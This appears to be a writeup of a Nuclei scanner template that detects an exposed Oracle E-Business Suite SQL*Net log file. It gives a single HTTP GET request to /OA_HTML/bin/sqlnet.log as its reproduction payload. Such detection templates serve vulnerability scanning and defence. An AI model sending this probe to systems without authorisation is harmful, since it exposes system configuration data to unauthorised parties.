# Nuclei Template: Oracle EBS - SQL Log Disclosure
**Template ID:** oracle-ebs-sqllog-disclosure
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`oracle-ebs-sqllog-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
An Oracle EBS SQL log was discovered.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/OA_HTML/bin/sqlnet.log
```

## References
- https://the-infosec.com/2017/03/29/do-you-know-what-your-erp-is-telling-us/
